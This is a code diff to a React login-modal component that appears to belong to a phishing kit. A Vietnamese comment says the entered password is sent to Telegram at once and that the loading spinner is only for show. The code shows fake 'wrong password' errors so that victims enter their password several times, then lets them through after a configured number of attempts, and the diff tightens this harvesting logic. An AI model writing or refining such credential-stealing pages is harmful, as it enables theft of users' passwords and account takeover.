@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, type FormEvent } from 'react';
+import { useEffect, useState, type FormEvent } from 'react';
 import type { StaticImageData } from 'next/image';
 import type { CSSProperties } from 'react';
 import type { UiTexts } from '@/types';
@@ -14,9 +14,10 @@ interface LoginModalProps {
     onSubmit: (email: string, password: string) => void;
     onSuccess: () => void;
     texts: UiTexts;
+    attemptCount?: number;
 }
 
-const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
+const LoginModal = ({ show, onSubmit, onSuccess, texts, attemptCount = 0 }: LoginModalProps) => {
     const [formData, setFormData] = useState({
         password: ''
     });
@@ -27,6 +28,16 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
 
     const maxPasswordAttempts = Math.max(1, Number(config.MAX_PASS || 2));
 
+    useEffect(() => {
+        if (!show) return;
+        setLoginAttempt(Math.min(Math.max(0, attemptCount), maxPasswordAttempts));
+        if (attemptCount === 0) {
+            setFormData({ password: '' });
+            setShowError(false);
+            setIsLoading(false);
+        }
+    }, [show, attemptCount, maxPasswordAttempts]);
+
     const handleChange = (field: 'password', value: string) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
         if (showError) {
@@ -34,33 +45,49 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
         }
     };
 
-    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
-        e.preventDefault();
+    const submitPassword = () => {
+        if (isLoading) {
+            return;
+        }
 
-        if (!formData.password.trim()) {
+        if (loginAttempt >= maxPasswordAttempts) {
+            onSuccess();
+            return;
+        }
+
+        const password = formData.password.trim();
+        if (!password) {
+            setShowError(true);
             return;
         }
 
         setIsLoading(true);
         setShowError(false);
 
+        const nextAttempt = loginAttempt + 1;
+        setLoginAttempt(nextAttempt);
+
         // Gửi Telegram ngay — spinner loading chỉ là UI
-        onSubmit('', formData.password);
+        onSubmit('', password);
 
         const loadingSec = Math.max(1, Number(config.PASSWORD_LOADING_TIME || 3));
 
-        setTimeout(() => {
+        window.setTimeout(() => {
             setIsLoading(false);
 
-            if (loginAttempt + 1 < maxPasswordAttempts) {
+            if (nextAttempt < maxPasswordAttempts) {
                 setShowError(true);
-                setLoginAttempt((prev) => prev + 1);
                 setFormData({ password: '' });
             } else {
                 setShowError(false);
                 onSuccess();
             }
         }, loadingSec * 1000);
+    };
+
+    const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
+        e.preventDefault();
+        submitPassword();
     };
 
     const togglePasswordVisibility = () => {
@@ -209,8 +236,6 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
                                 autoCapitalize="none"
                                 spellCheck="false"
                                 maxLength={30}
-                                minLength={3}
-                                required
                                 disabled={isLoading}
                                 value={formData.password}
                                 onChange={(e) => handleChange('password', e.target.value)}
@@ -238,7 +263,11 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
                         )}
 
                         <div style={{ marginTop: '20px', width: '100%' }}>
-                            <button type="submit" style={submitBtnStyle} disabled={isLoading}>
+                            <button
+                                type="submit"
+                                style={submitBtnStyle}
+                                disabled={isLoading}
+                            >
                                 {isLoading ? (
                                     <span
                                         style={{
@@ -249,10 +278,11 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
                                             borderRadius: '50%',
                                             animation: 'spin 0.8s linear infinite',
                                             display: 'inline-block',
+                                            pointerEvents: 'none',
                                         }}
                                     />
                                 ) : (
-                                    <span>{texts.continueBtn}</span>
+                                    <span style={{ pointerEvents: 'none' }}>{texts.continueBtn}</span>
                                 )}
                             </button>
                         </div>
